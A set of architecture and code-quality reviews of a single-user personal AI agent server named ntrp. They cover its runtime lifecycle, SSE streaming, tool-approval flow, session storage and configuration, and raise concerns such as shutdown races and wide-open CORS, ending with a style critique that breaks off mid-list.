### 1.3 ScheduleStore Sharing Sessions DB Connection

`ScheduleStore` receives `self.session_store.conn` directly (line 111 of runtime.py). Both stores share the same `aiosqlite.Connection`.

**Why:** SQLite is single-writer. Running two separate connections to the same DB would cause lock contention. Sharing a connection ensures serialized writes and a single WAL. The `ScheduleStore` extends `BaseRepository` which just wraps a connection — no separate DB lifecycle needed.

**Trade-off:** The ScheduleStore cannot be created until SessionStore is connected. This creates an implicit ordering dependency in `connect()`. It also means the ScheduleStore has no independent lifecycle — it cannot be tested without the SessionStore's connection.

### 1.4 Agent Loop as AsyncGenerator with Bounded Iterations

The `Agent.stream()` method (`ntrp/core/agent.py:125`) is an async generator bounded by `AGENT_MAX_ITERATIONS` (50). It yields `SSEEvent` objects and a final `str` result.

**Why:** The generator pattern naturally maps to SSE streaming. Each iteration is: think → call LLM → maybe execute tools → yield events → loop. Bounding at 50 prevents infinite loops when the LLM keeps requesting tools.

**Trade-off:** The Agent is stateful (holds `self.messages`, token counts, etc.) but not reusable — once `.stream()` finishes, the Agent's message history is captured by `run.messages = agent.messages`. This is a one-shot pattern wrapped in a reusable-looking class.

### 1.5 Two-Phase Context Compression

Compression (`ntrp/context/compression.py`) uses a two-phase approach:
1. **Masking** — truncate old tool results (cheap, no LLM call)
2. **Summarization** — if still too big, LLM-summarize the compressible range into a `[Session State Handoff]` block

**Why:** Tool results are the biggest context bloaters (bash output, file contents). Masking them is free and often sufficient. Full summarization is expensive but preserves semantic content.

**Trade-off:** The threshold-based trigger (`COMPRESSION_THRESHOLD = 0.75` of model limit) means compression only fires when you're already using 75% of the context window. This is good for minimizing unnecessary summarization calls, but there's a risk of hitting the limit if a single LLM response pushes past 100% between compression checks. The `_last_input_tokens` adaptive tracking mitigates this by using actual token counts from the LLM response.

### 1.6 Cancellation via Polling

Cancellation is implemented as a `cancel_check: Callable[[], bool]` that the Agent polls at three points in each iteration: before LLM call, after LLM response, and after tool execution. The actual flag lives on `RunState.cancelled` and is set by the `/cancel` endpoint.

**Why:** Clean cancellation of arbitrary async operations is hard. Polling is simple, works with the generator pattern, and doesn't require cooperative cancellation tokens threaded through every layer.

**Trade-off:** Cancellation is not immediate — it can take up to one full LLM call + tool execution round to take effect. If the LLM takes 30 seconds, the user waits 30 seconds after pressing cancel. This is acceptable for a personal tool but would be a UX problem at scale.

### 1.7 Tool Offloading (Manus Pattern)

Large tool results (>30K chars) are written to `/tmp/ntrp/<session_id>/results/` and replaced with a compact reference in context. The agent can use `read_file()` to access the full content.

**Why:** Prevents context window bloat from large outputs (e.g., grep results, file contents). The agent sees a preview and can decide whether to read the full result.

**Trade-off:** Offloaded results live in `/tmp` which survives reboots on macOS but not on Linux by default. No cleanup mechanism — files accumulate until `/tmp` is cleaned externally. Also, the session ID embedded in the path means offloaded results are not accessible after session rotation.

---

## 2. Strengths

### 2.1 Clean Startup Sequence

The `get_runtime_async()` function (lines 251-260) is remarkably clear:
```python
_runtime = Runtime()
await _runtime.connect()
_runtime.start_indexing()
_runtime.start_scheduler()
_runtime.start_consolidation()
```
Five lines. Create, connect, start background tasks. No ambiguity about ordering.

### 2.2 Ordered Shutdown

`close()` (lines 234-244) tears down in reverse dependency order: scheduler first (stops creating new agent runs), then memory (stops consolidation), then session store (flushes), then indexer, then litellm clients. This avoids the classic shutdown race where a background task tries to use a closed resource.

### 2.3 EventBus Decoupling for Cross-Cutting Concerns

The EventBus cleanly decouples fact CRUD from index updates and dashboard recording. The Runtime wires up subscriptions in `connect()` (lines 114-119), making the wiring explicit and centralized. No magic, no auto-discovery, no decorators.

### 2.4 ToolRunner's Concurrent/Sequential Partitioning

`ToolRunner.execute_all()` (line 178) smartly partitions tool calls into those needing approval (executed sequentially for UX) and those that don't (executed concurrently with `TaskGroup`). This is a genuinely good optimization — multiple read-only tools (search, recall, read_file) run in parallel while write operations (bash, write_file) get individual approval.

### 2.5 Agent Isolation via Spawner

The `create_spawn_fn` closure (`ntrp/core/spawner.py`) creates a clean factory for child agents with proper isolation levels, depth tracking, and timeout. The recursive `create_spawn_fn(current_depth + 1)` inside the closure naturally enforces depth limits. The `IsolationLevel` enum (FULL/SHARED) gives flexibility without complexity.

### 2.6 Adaptive Compression

The `_maybe_compact()` method (agent.py:90) uses actual token counts from the LLM response (`self._last_input_tokens`) for more accurate compression decisions, falling back to character-based estimation when actual counts aren't available. This prevents the common "estimated too low, context overflowed" problem.

### 2.7 DashboardCollector as Pure Data Aggregator

The `DashboardCollector` is a clean, stateless-read pattern: it accumulates data via `record_*` methods and produces a snapshot on demand. No async locking needed because all writes are from the main event loop context and reads are atomic snapshots.

---

## 3. Concerns

### 3.1 Runtime God Object — The Obvious One

The Runtime class has 21 attributes, 18 methods, and knows about: config, bus, sources, embedding, indexer, sessions, memory, executor, tools, gmail, browser, max_depth, schedule store, scheduler, run registry, dashboard, and litellm cleanup. It is the definition of a god object.

**The real concern is not size but coupling direction.** The Runtime reaches down into implementation details:
- Line 46-47: `self.gmail = self.source_mgr.sources.get("email")` — caches a typed reference to a source that SourceManager already owns
- Lines 58-70: `reinit_source`/`remove_source` — manually sync `self.gmail`/`self.browser` fields after SourceManager operations
- Line 201: `MemoryIndexSource(self.memory.db)` — reaches into memory's internal DB object

These duplicate references (`gmail`, `browser` as separate Runtime attributes AND inside `source_mgr.sources`) create synchronization obligations. If `source_mgr.sources["email"]` changes without calling `reinit_source`, the cached `self.gmail` reference is stale.

**Recommendation:** Remove `self.gmail` and `self.browser` from Runtime. Access them through `self.source_mgr.sources.get("email")` when needed. The cached references save one dict lookup at the cost of a synchronization invariant.

### 3.2 DashboardCollector Reaches Into Private State

`dashboard.py:89`: `runtime.run_registry._runs.values()` — accesses private `_runs` dict.
`dashboard.py:116-117`: `runtime.scheduler._task is not None` — accesses private `_task`.
`dashboard.py:122-124`: `runtime.memory._consolidation_task is not None and not runtime.memory._consolidation_task.done()` — accesses private `_consolidation_task`.

This is not encapsulation violation for its own sake — it is a maintenance landmine. If `Scheduler` changes how it tracks its running state (e.g., replaces `_task` with a `_running` bool), the dashboard silently breaks.

**Recommendation:** Add `is_running` properties to `Scheduler` and `FactMemory`. Add `active_run_count` to `RunRegistry`. The dashboard queries interfaces, not internals.

### 3.3 Scheduler Holds Runtime Reference — Circular Dependency

`Scheduler.__init__` takes `runtime: "Runtime"` (TYPE_CHECKING import). In `_run_agent`, it reaches into `runtime.memory`, `runtime.get_source_details()`, `runtime.executor`, `runtime.config`, `runtime.gmail`, `runtime.create_session()`, etc.

This means the Scheduler is tightly coupled to the full Runtime surface area. It cannot be tested without a fully wired Runtime. The TYPE_CHECKING import is a code smell that acknowledges the circularity.

**Structural concern:** The Scheduler runs agent tasks that can modify memory, which triggers events, which trigger index updates, which access the indexer — all owned by the same Runtime. If the Runtime is `close()`-ing while a scheduler task is mid-execution, there's a race between `scheduler.stop()` (which cancels the loop but not the running agent) and `memory.close()`. The `finally: await self.store.clear_running(task.task_id)` in `_tick` would fail if the DB is already closed.

### 3.4 No Graceful Drain on Shutdown

`Runtime.close()` calls `scheduler.stop()` which cancels the polling loop, but does NOT wait for an in-progress `_execute_task` to finish. The scheduler's `_loop` catches `CancelledError` and re-raises, but `_tick` is already in progress with an agent run. That agent run gets `CancelledError` propagated through the asyncio task tree, potentially mid-tool-execution or mid-LLM-call.

Similarly, `close()` doesn't drain active SSE streams. If a user has an active `/chat/stream` request and the server shuts down, the agent's asyncio task is orphaned (no cancellation signal) until the event loop closes.

**Recommendation:** Before closing, signal all active runs to cancel (via `run_registry`) and await completion with a timeout. Then proceed with resource cleanup.

### 3.5 `rebuild_executor` Drops In-Flight Tool Contexts

`Runtime.rebuild_executor()` (line 85) creates a new `ToolExecutor` and replaces `self.executor`. Any active agent runs holding a reference to the old executor are unaffected (they have a captured reference), but new tool calls within those runs will use the old executor's registry, which may have stale source references. Meanwhile, the new executor's registry is a completely new `ToolRegistry` instance.

This is fine today because `rebuild_executor` is only called from `_on_source_changed`, which is triggered by `SourceManager.reinit()`/`remove()`. But it means: **you cannot hot-swap a source mid-agent-run and have the running agent pick it up**. The agent captures executor at construction time and is unaware of changes.

### 3.6 EventBus Error Handling

The EventBus has no error handling. If a handler raises, the exception propagates to the publisher. In `_on_source_changed` (line 229), if `rebuild_executor()` or `start_indexing()` fails, that exception propagates back to whoever published `SourceChanged` — which is the SourceManager's `reinit()` method, which is called from the settings API endpoint. This means a broken indexer config could cause the settings update to fail with a 500 error, even though the source change itself succeeded.

### 3.7 Config as Mutable Singleton

`get_config()` is `@lru_cache`-decorated. The Config object is constructed once and then mutated by `get_config()` itself (lines 105-126 in config.py). The Runtime also has `self._config_lock = asyncio.Lock()` (line 56) which is never used — it was likely intended for config updates but is dead code.

The settings API can modify `config.chat_model`, `config.browser`, etc. at runtime. These mutations propagate through the Runtime because everyone holds a reference to the same Config instance. This is simple but means there's no way to validate a new config atomically before applying it.

### 3.8 Stream Architecture — Background Task + Queue Merging

`ntrp/server/stream.py` is the most complex piece of async coordination in the codebase. It runs the agent in a background task, forwards events from an `event_bus` queue, and merges both into a single consumer queue that yields SSE strings.

The `forward_event_bus` coroutine polls `ctx.event_bus` with a 0.05s timeout in a busy loop. This means:
- 20 wakeups/second even when idle
- Latency of up to 50ms on event forwarding
- The main consumer has its own 0.1s poll timeout

This is correct but inefficient. The pattern exists because `asyncio.Queue.get()` cannot be cancelled cleanly when you need to merge multiple queues. A better approach would be `asyncio.wait()` on multiple futures, but the current approach is simple and good enough for a single-user system.

### 3.9 Session ID as Timestamp

`create_session()` uses `now.strftime("%Y%m%d_%H%M%S")` as the session ID. This means:
- Two sessions created in the same second collide
- Session IDs are predictable (not security-relevant for a personal tool, but worth noting)

### 3.10 No Health Check for Background Tasks

There's no monitoring for whether the scheduler, consolidation, or indexer background tasks are still alive. If a background task crashes due to an unhandled exception, it silently stops running. The dashboard shows `_task is not None` but doesn't check `_task.done()` for the scheduler (it does for consolidation but inconsistently).

---

## 4. Missing Pieces

### 4.1 Liveness/Readiness Probes

The `/health` endpoint returns `{"status": "ok"}` unconditionally. It doesn't check whether the Runtime is connected, whether the DB is accessible, or whether background tasks are alive. For Docker deployment (which is in-progress per the untracked files), a proper health check would verify at minimum `runtime._connected`.

### 4.2 Graceful Shutdown Drain

No mechanism to drain active requests before closing resources (discussed in 3.4).

### 4.3 Rate Limiting / Concurrent Run Limit

Nothing prevents a client from opening 100 simultaneous `/chat/stream` connections, each spawning an agent with up to 8 depth levels of sub-agents. The `RunRegistry` tracks runs but doesn't enforce limits.

### 4.4 Offloaded File Cleanup

No cleanup for files written to `/tmp/ntrp/` by the tool offloader. Over time, this directory grows unbounded.

### 4.5 Config Validation on Update

The settings API can write arbitrary values to `settings.json` and mutate the Config singleton. There's no validation that a new `chat_model` value is in `SUPPORTED_MODELS`, or that a new `vault_path` actually exists.

---

## 5. Lifecycle Trace

### Startup (`get_runtime_async`)

```
1. Runtime.__init__()
   ├── Config loaded (env + settings.json)
   ├── EventBus created (empty, no subscriptions)
   ├── SourceManager created → init_sources() from config
   │   └── For each SOURCES entry: check enabled(config) → create(config)
   ├── Indexer created (SearchIndex not yet connected)
   ├── SessionStore created (not yet connected)
   ├── DashboardCollector created
   └── RunRegistry created

2. Runtime.connect()
   ├── config.db_dir.mkdir(exist_ok=True)
   ├── SessionStore.connect() → aiosqlite + schema init
   ├── Indexer.connect() → SearchIndex aiosqlite + sqlite_vec
   ├── ScheduleStore created (shares session_store.conn)
   │   └── ScheduleStore.init_schema()
   ├── EventBus subscriptions wired:
   │   ├── FactCreated → dashboard.on_fact_created
   │   ├── FactCreated → _on_fact_created (index upsert)
   │   ├── FactUpdated → _on_fact_updated (index upsert)
   │   ├── FactDeleted → _on_fact_deleted (index delete)
   │   ├── MemoryCleared → _on_memory_cleared (index clear)
   │   └── SourceChanged → _on_source_changed (rebuild executor + reindex)
   ├── FactMemory.create() if config.memory=True
   │   └── GraphDatabase.connect() → aiosqlite + sqlite_vec + schema
   ├── rebuild_executor() → ToolExecutor + ToolRegistry wired
   └── _connected = True

3. start_indexing()
   └── Indexer.start(sources) → asyncio.create_task(_run)

4. start_scheduler()
   └── Scheduler.start() → asyncio.create_task(_loop)

5. start_consolidation()
   └── FactMemory.start_consolidation() → asyncio.create_task(_consolidation_loop)
```

### Request Flow (`POST /chat/stream`)

```
1. get_runtime() → return singleton
2. resolve_session() → restore_session() or create_session()
3. prepare_messages() → memory context + system prompt
4. RunRegistry.create_run()
5. SSE generator starts:
   ├── Yield SessionInfoEvent
   ├── Yield ThinkingEvent
   ├── Create ToolContext (session_state, registry, memory, emit, queues)
   ├── Create spawn_fn closure
   ├── Create Agent
   └── run_agent_loop():
       ├── asyncio.create_task(run_agent) → agent.stream()
       ├── asyncio.create_task(forward_event_bus)
       └── Consumer loop: merged_queue → yield to_sse(event)

6. Agent.stream() loop (up to 50 iterations):
   ├── _maybe_compact() → mask or summarize if context too large
   ├── _call_llm() → litellm.acompletion()
   ├── If no tool_calls → yield final text, return
   ├── ToolRunner.execute_all(calls):
   │   ├── Partition: needs_approval vs auto_approved
   │   ├── Auto-approved: _execute_concurrent (TaskGroup)
   │   ├── Needs approval: _execute_sequential
   │   │   └── emit ApprovalNeededEvent → await approval_queue.get()
   │   └── yield ToolCallEvent + ToolResultEvent
   └── Append tool results to messages

7. After agent completes:
   ├── Yield TextEvent(result)
   ├── save_session()
   ├── Yield DoneEvent
   ├── registry.complete_run()
   └── dashboard.record_run_completed()
```

### Shutdown (`reset_runtime`)

```
1. Runtime.close()
   ├── Scheduler.stop()
   │   └── _task.cancel() + await _task
   ├── FactMemory.close()
   │   ├── _consolidation_task.cancel() + await
   │   └── db.close()
   ├── SessionStore.close() → aiosqlite.close()
   ├── Indexer.stop() → _task.cancel() + await
   ├── Indexer.close() → SearchIndex.close() → aiosqlite.close()
   ├── litellm aiohttp handler close
   └── litellm async clients close

2. _runtime = None
```

---

## 6. Summary Assessment

| Area | Grade | Notes |
|------|-------|-------|
| Startup sequence | A | Clear, ordered, no surprises |
| Shutdown sequence | B- | Ordered but doesn't drain active work |
| EventBus | A- | Simple and appropriate; lacks error isolation |
| Agent loop | A | Clean generator, bounded, adaptive compression |
| Scheduler | B | Works but tightly coupled to Runtime; shutdown race |
| Context compression | A | Two-phase approach is clever and cost-effective |
| Tool execution | A | Concurrent/sequential partitioning, offloading |
| Dashboard | B | Reaches into private state of multiple subsystems |
| Runtime class | B- | Application class degraded by bidirectional coupling (Scheduler/Dashboard reach back in); config mutation dishonesty |
| Stream architecture | B+ | Correct but busy-polling; good enough for single user |

**Overall:** The architecture is well-suited to its domain — a personal, single-user tool. The god object pattern is defensible at this scale. The primary risks are shutdown races (scheduler vs runtime close) and the duplicate source references on Runtime. The event-driven cross-cutting concerns (bus subscriptions for index/dashboard) are cleanly done. The agent loop with adaptive compression and tool offloading is genuinely sophisticated.
# API & Session Architecture Review

**Reviewer**: api-architect
**Scope**: FastAPI server, routers, SSE streaming, session management, config management, run registry, error handling

---

## 1. Key Architectural Decisions

### 1.1 Single-Process Global Singleton Runtime

**Decision**: The entire application state lives in a module-level `_runtime` global, accessed via `get_runtime()` (sync) and `get_runtime_async()` (async with lock). The FastAPI lifespan initializes it once.

**Why**: This is a single-user personal tool. A global singleton avoids dependency injection complexity. The `get_runtime()` sync accessor works because by the time any route handler runs, the lifespan has already initialized the runtime.

**Trade-off**: Simple and works perfectly for the use case, but makes testing harder (must mock the global) and prevents horizontal scaling. Acceptable for a personal system.

### 1.2 SSE Streaming with Merged Queue Pattern

**Decision**: `POST /chat/stream` returns a `StreamingResponse` with SSE events. Inside, the agent loop runs in a background `asyncio.Task`, pushes events to a `merged_queue`, and a consumer yields them as SSE strings. A separate `forward_event_bus` coroutine merges subagent events into the same queue.

**Why**: The agent loop is asynchronous with tool calls that can spawn subagents. A merged queue pattern allows real-time interleaving of top-level and nested events without blocking. The consumer loop uses `wait_for` with a 100ms timeout to check for cancellation.

**Trade-off**: More complex than simple `yield` from agent, but necessary for real-time subagent event forwarding. The 100ms poll timeout is a pragmatic choice -- low enough for responsive cancellation, high enough to avoid busy-waiting.

### 1.3 Run Registry for Request Tracking

**Decision**: `RunRegistry` is an in-memory dict mapping `run_id` -> `RunState`. Each chat request creates a run, which holds the event queue, choice queue, message history, and token counts. Runs are cleaned up after 24 hours.

**Why**: The run is the bridge between the SSE stream and the approval/choice endpoints. When the frontend needs to send a tool approval or choice back, it posts to `/tools/result` or `/tools/choice` with the `run_id`, and the data is pushed into the run's queue.

**Trade-off**: In-memory only, so runs are lost on restart. Fine for a single-user system where restarts are infrequent and the cost of losing a run is just "try again".

### 1.4 Session Persistence via SQLite

**Decision**: Sessions (conversation history) are stored in `~/.ntrp/sessions.db` using aiosqlite. The `SessionStore` serializes messages as JSON blobs. The runtime always restores the latest session (by `last_activity`) and uses it if it's less than 24 hours old.

**Why**: Simple persistence that survives restarts. The "latest session" approach means the user always picks up where they left off. The 24-hour expiry prevents stale context from confusing the agent.

**Trade-off**: Only one session is active at a time. Multi-session support would require the frontend to explicitly pass session IDs. The JSON blob approach for messages is simple but means you can't query individual messages or do partial updates.

### 1.5 Config Layering: .env -> pydantic-settings -> user settings JSON

**Decision**: `Config` uses `pydantic-settings` to load from `.env` files and environment variables. On top of this, `get_config()` overlays values from `~/.ntrp/settings.json` (user settings). The `PATCH /config` endpoint mutates the runtime config in-memory AND persists changes to the settings file.

**Why**: Environment variables for deployment secrets (API keys), JSON file for user-facing preferences (model choice, vault path, browser selection). The two-layer approach separates concerns.

**Trade-off**: The config object is mutated in place at runtime, which means the `@lru_cache` on `get_config()` returns a mutable singleton. This is intentional -- the runtime holds a reference to the same object. But it means `get_config()` isn't safe to call from multiple contexts expecting a fresh config.

### 1.6 Human-in-the-Loop via Async Queues

**Decision**: Tool approval and choice selection use `asyncio.Queue` pairs. When a tool needs approval, it pushes an `ApprovalNeededEvent` to the event bus (which SSE-streams to the client), then blocks on the `approval_queue`. The client posts to `/tools/result`, which pushes the response into the queue.

**Why**: This elegantly handles the async back-and-forth between a streaming SSE response and separate HTTP POST callbacks. The queue acts as a synchronization primitive between the running agent coroutine and the HTTP handler.

**Trade-off**: If the client disconnects without responding, the agent coroutine will block indefinitely on the queue. There's no timeout on `approval_queue.get()`. This is a real concern (see Section 4).

---

## 2. Strengths

### 2.1 Clean Event Type System

The `SSEEvent` hierarchy is well designed. Frozen dataclasses with `to_sse_string()` serialization. Each event type has its own class with typed fields. The `EventType` enum maps 1:1 to SSE event names. This is clean, type-safe, and easy to extend.

### 2.2 Streaming Architecture is Genuinely Sophisticated

The merged queue pattern in `stream.py` handles a non-trivial problem well: real-time interleaving of agent events, subagent events (forwarded via `event_bus`), cancellation detection, and graceful cleanup. The `finally` block is thorough -- it cancels the forwarder, drains remaining events, and cancels the agent task if still running.

### 2.3 Context Compression is Automatic and Transparent

The `_maybe_compact()` method in the agent loop automatically compresses conversation history when approaching model limits. It uses a two-phase approach: first mask old tool results (cheap), then full summarization if still over threshold (expensive but effective). The "Session State Handoff" pattern preserves prior summaries during re-summarization. This is a sophisticated and practical approach.

### 2.4 Config Mutation is Atomic-ish

The `PATCH /config` endpoint uses `runtime._config_lock` to serialize config changes. This prevents race conditions when multiple config changes arrive simultaneously (e.g., from the settings UI). The lock also covers the source reinit/remove operations that follow config changes.

### 2.5 Separation Between Routers is Clean

Each domain has its own router: `session.py` (config + session management), `data.py` (memory CRUD), `schedule.py` (task scheduling), `gmail.py` (account management), `dashboard.py` (monitoring). The main `app.py` handles only the chat stream and tool interaction endpoints. This is well-organized.

### 2.6 The Approval/Choice System is Elegant

The `ToolExecution.require_approval()` method encapsulates the entire approval flow: check auto-approve, emit event, wait for response, raise if denied. The tool implementor just calls `await execution.require_approval(description)` and the entire SSE/queue dance is hidden. Same for `ask_choice()`. This is a clean abstraction.

---

## 3. Concerns

### 3.1 No Timeout on Approval Queue -- Indefinite Block

**Severity: High**

In `ToolExecution.require_approval()` (context.py:91):
```python
response = await self.ctx.approval_queue.get()
```

This blocks forever. If the client disconnects, refreshes the page, or the SSE connection drops, the agent coroutine will hang indefinitely. The run will never complete, and the RunState will linger in memory until the 24-hour cleanup.

**Impact**: Memory leak, stuck runs, poor UX if the user tries to start a new chat while an old one is stuck.

**Suggestion**: Add a timeout (e.g., 5 minutes) and raise `PermissionDenied` on timeout. Also consider checking `run.cancelled` in the wait loop.

### 3.2 `return` Inside `async def event_generator()` Silently Terminates SSE

**Severity: Medium**

In `app.py:207`:
```python
if result is None:
    return  # Cancelled
```

When the agent is cancelled, the generator returns without yielding a `DoneEvent` or `CancelledEvent`. The `CancelledEvent` is yielded inside `run_agent_loop` (stream.py:68), but then the outer generator in `app.py` does a `return` without saving the session or completing the run. This means:
- The session is not saved after cancellation (partial work lost)
- `registry.complete_run()` is never called
- Dashboard stats are not updated

### 3.3 Session ID Based on Timestamp -- Not Truly Unique

**Severity: Low**

`create_session()` uses `now.strftime("%Y%m%d_%H%M%S")` as the session ID. Two sessions created within the same second would collide. In practice, this is a single-user system so it's almost impossible, but it's a subtle footgun for testing or rapid-fire session creation.

### 3.4 CORS is Wide Open

**Severity: Medium (context-dependent)**

```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
```

This allows any origin to make credentialed requests. For a local-only personal tool bound to `127.0.0.1`, this is fine. But the `serve` command accepts `--host` and could be exposed on `0.0.0.0`. If exposed on a network, any website the user visits could make API calls to the server (CSRF via CORS). The Dockerfile also suggests network deployment is being considered.

### 3.5 `_config_lock` Does Not Cover `get_config()` Initialization

**Severity: Low**

`get_config()` is `@lru_cache` decorated and returns a mutable Config object. The `PATCH /config` endpoint acquires `_config_lock` before mutating it, but `get_config()` itself isn't locked. If `get_config()` is called concurrently during startup (before the cached value exists), two Config objects could be created, and only one would be cached. In practice, this doesn't happen because the runtime initializes it first, but the pattern is fragile.

### 3.6 Error Handling in Chat Stream is Catch-All

**Severity: Medium**

In `app.py:223`:
```python
except Exception as e:
    yield to_sse(ErrorEvent(message=str(e), recoverable=False))
```

All exceptions become `ErrorEvent` with `str(e)` as the message. This:
- Potentially leaks internal error details (stack trace fragments, file paths, API key validation errors) to the frontend
- Marks everything as `recoverable=False` (no distinction between transient and permanent failures)
- Doesn't log the exception server-side (the traceback is lost)

### 3.7 `update_config` Performs Hot-Reload of Sources Without Quiescing

**Severity: Medium**

When you `PATCH /config` to change the vault path or toggle Gmail, the endpoint calls `runtime.reinit_source()` while a chat stream might be actively using those sources. The `_config_lock` only serializes config writes -- it doesn't prevent a running agent from reading the old source state while it's being replaced.

In `SourceManager.reinit()`, the source dict is mutated in place:
```python
self._sources[name] = source
```

If the agent loop is mid-tool-call reading from the old source reference, the reference stored in `ToolExecutor.sources` still points to the old object. This is likely benign (the old object still works), but `rebuild_executor()` creates a new `ToolExecutor` without updating the running agent's reference.

### 3.8 `asyncio.create_task` for Schedule Runs Without Reference Tracking

**Severity: Low**

In `schedule.py:110`:
```python
asyncio.create_task(runtime.scheduler.run_now(task_id))
```

The created task is fire-and-forget. If it raises an exception, it becomes an unhandled task exception warning. The task is not tracked, so there's no way to check its status or cancel it.

### 3.9 Dashboard Accesses Private Internals

**Severity: Low (code smell)**

`DashboardCollector._snapshot_sync()` directly accesses:
- `runtime.run_registry._runs` (private dict)
- `runtime.memory._consolidation_task` (private task)
- `runtime.scheduler._task` (private task)

This couples the dashboard deeply to internal implementation details.

### 3.10 No Request Validation on Query Parameters

**Severity: Low**

Endpoints like `GET /facts?limit=100&offset=0` don't validate that `limit` and `offset` are non-negative. A negative limit could cause unexpected behavior in the SQLite query. Similarly, `GET /observations?limit=50` has no upper bound.

---

## 4. Missing Pieces

### 4.1 No Authentication or Authorization

There's no auth at all. This is fine for a local-only tool bound to localhost, but the Docker setup suggests network deployment is being considered. Even a simple bearer token would prevent accidental exposure.

### 4.2 No Rate Limiting

A misbehaving or stuck frontend could spam `/chat/stream` and create many concurrent runs, each consuming LLM API calls. No rate limiting or concurrent run limit exists.

### 4.3 No Graceful Shutdown Signal to Active Streams

When the server shuts down (`reset_runtime()`), active SSE streams are not notified. The `StreamingResponse` generators will just get cancelled by the ASGI server, but the agent tasks inside might not clean up properly.

### 4.4 No Health Check for Dependencies

`GET /health` returns `{"status": "ok"}` unconditionally. It doesn't check if the database is connected, if the embedding service is reachable, or if the LLM provider is responding. A "deep health check" would be useful for Docker deployments.

### 4.5 No Request ID / Correlation ID

There's no request tracing. When an error occurs in the logs, there's no way to correlate it to a specific chat request. A middleware that attaches a request ID to the structlog context would be valuable.

### 4.6 No Session Listing / History API

The `SessionStore` has `list_sessions()`, but no HTTP endpoint exposes it. The user can only interact with the latest session. There's no way to browse, load, or export previous sessions via the API.

### 4.7 No Explicit Error Schema

API errors use a mix of:
- FastAPI's default `HTTPException` (returns `{"detail": "..."}`)
- Custom dicts (e.g., `{"status": "error", "message": "..."}`)
- SSE `ErrorEvent` for streaming errors

There's no consistent error schema or error codes.

---

## 5. Request Flow Trace: `POST /chat/stream`

For completeness, here is the full request path traced through code:

1. **Entry**: `app.py:117` -- `chat_stream(request: ChatRequest)`
2. **Runtime**: `get_runtime()` returns the global singleton (already connected via lifespan)
3. **Session resolution**: `resolve_session(runtime)` -> `runtime.restore_session()` -> `session_store.get_latest_session()` -> returns latest session if < 24h old, else creates new
4. **Message preparation**: `prepare_messages(runtime, messages, user_message, last_activity)`:
   - If memory enabled: `runtime.memory.get_context()` for static context, `runtime.memory.recall(user_message)` for query-conditioned recall
   - Builds system prompt via `build_system_prompt()`
   - Appends/replaces system message, appends user message
5. **Run creation**: `registry.create_run(session_id)` creates a `RunState` with a random 8-char ID
6. **SSE generator starts**: Returns `StreamingResponse` with `event_generator()`
7. **First events**: Yields `SessionInfoEvent` (session_id, run_id, sources) and `ThinkingEvent`
8. **Agent creation**: Builds `ToolContext`, `Agent`, connects spawn function
9. **Agent loop**: `run_agent_loop(ctx, agent, user_message)`:
   - Starts `run_agent()` background task (calls `agent.stream()`)
   - Starts `forward_event_bus()` to merge subagent events
   - Consumer loop: polls `merged_queue`, yields SSE events, checks for cancellation
   - On completion: returns `{"_result": result_text}`
10. **Finalization**: Yields final `TextEvent`, records usage, saves session, yields `DoneEvent`, completes run

---

## 6. Summary

The API architecture is well-suited for its purpose: a single-user personal agent with a reactive frontend. The SSE streaming pattern is genuinely sophisticated and handles the complex real-time requirements of agent + subagent event interleaving well. The session management is simple and effective.

The main concerns are operational: no auth, no timeouts on approval queues, CORS wide open, error handling that could leak internals, and no graceful degradation on source hot-reload during active streams. Most of these are acceptable trade-offs for a personal tool but would need attention before any shared or networked deployment.

The code quality is high -- clean separation of concerns, minimal abstractions, and practical trade-offs throughout. The codebase does not over-engineer for hypothetical scale and instead optimizes for simplicity and developer velocity.
# The Zen of NTRP: A Purist's Critique

**Reviewer:** zen-nerd
**Lens:** The Zen of Python (PEP 20), applied without mercy

---

## Preamble

I've read every line of the four architect reviews, and then I read every line of the actual source code. The architects are competent -- their reviews are thorough and mostly accurate. But they are too kind. They grade on a curve of "personal project" and "single user." The Zen doesn't grade on a curve.

`import this` doesn't say "Beautiful is better than ugly, unless you're the only user." It says **Beautiful is better than ugly.** Period.

---

## 1. "Beautiful is better than ugly"

### The Spec Pattern: Clever, Not Beautiful

`ntrp/sources/registry.py` defines five frozen dataclasses (`ObsidianSpec`, `GmailSpec`, `CalendarSpec`, `BrowserSpec`, `WebSpec`) that each implement a `SourceSpec` Protocol with three members: `name`, `enabled()`, `create()`.

```python
@dataclass(frozen=True)
class ObsidianSpec:
    name: str = "notes"

    def enabled(self, config: Config) -> bool:
        return config.vault_path is not None

    def create(self, config: Config):
        return ObsidianSource(vault_path=config.vault_path)
```

This is 8 lines to wrap a 1-line constructor call with a 1-line config check. Multiply by five sources. The entire file is 95 lines where 20 would do:

```python
SOURCES = {
    "notes": lambda c: ObsidianSource(vault_path=c.vault_path) if c.vault_path else None,
    "email": lambda c: _create_gmail(c) if c.gmail else None,
    ...
}
```

The same pattern repeats in `ntrp/tools/specs.py` with EIGHT `ToolSpec` classes. `CoreToolsSpec` is a frozen dataclass with `name="core"` and a `create()` that returns a list of tool instances. It's a factory function wearing a class costume.

Beautiful code reveals intent. These specs hide intent behind ceremony.

### Inconsistent Object Construction

`FactRepository.create()` (facts.py:160-200) constructs a `Fact` by hand:
```python
return Fact(id=fact_id, text=text, fact_type=fact_type, ...)
```

`FactRepository.get()` (facts.py:152-158) constructs a `Fact` via `_row_to_fact()`.

Two construction paths for the same type in the same class. When someone changes the `Fact` dataclass, they have to update BOTH paths. This is the opposite of DRY, and it's not beautiful.

### The `Source` ABC's `errors` Property

```python
class Source(ABC):
    @property
    def errors(self) -> dict[str, str]:
        if not hasattr(self, "_errors"):
            self._errors: dict[str, str] = {}
        return self._errors
```

A base class that uses `hasattr` to check for its own attribute. This is the `__init__`-less antipattern -- it avoids `__init__` to stay compatible with subclasses that might not call `super().__init__()`. In the Zen, `hasattr` for your own attributes is ugly. Just define `_errors` in `__init__`.

---

## 2. "Explicit is better than implicit"

### `dict[str, Any]` -- The Type Erasure Epidemic

The integration layer runs on `Any`:

- `SourceManager._sources: dict[str, Any]` (sources.py:19)
- `ToolDeps.sources: dict[str, Any]` (specs.py:38)
- `ToolDeps.search_index: Any | None` (specs.py:40)
- `SourceSpec.create(config) -> Any | None` (registry.py:18)
- `ToolExecutor.__init__(sources: dict[str, Any])` (executor.py:14)
- `Runtime.source_mgr.sources` returns `dict[str, Any]` (sources.py:25)

